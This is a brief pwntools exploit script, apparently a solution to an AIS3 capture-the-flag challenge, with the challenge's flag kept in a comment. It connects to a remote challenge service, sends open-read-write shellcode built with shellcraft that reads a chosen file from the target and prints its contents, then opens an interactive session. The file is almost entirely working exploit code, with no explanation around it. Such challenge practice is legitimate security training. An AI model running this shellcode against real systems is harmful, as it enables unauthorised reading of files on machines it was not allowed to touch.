#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# ais3{hav3_Y0U_successfu11Y_sO1v3d_Y3T_another_0rw}

e = ELF('')
l = ELF('')

context.arch = 'amd64'

#y = process( './secretgarden' , env = {'LD_PRELOAD':'./libc_64.so.6'} )
#print util.proc.pidof(y)

host , port = '10.13.2.43' , 10739
y = remote( host , port )


_asm = """


"""

sc = shellcraft.read(0 , 0x601b20 , 42)
sc += shellcraft.open(0x601b20 , 0 , 0)
sc += shellcraft.read( 'rax' , 'rsp' , 42 )
sc += shellcraft.write( 1 , 'rsp' , 42)


y.send( asm( sc ) )








y.interactive()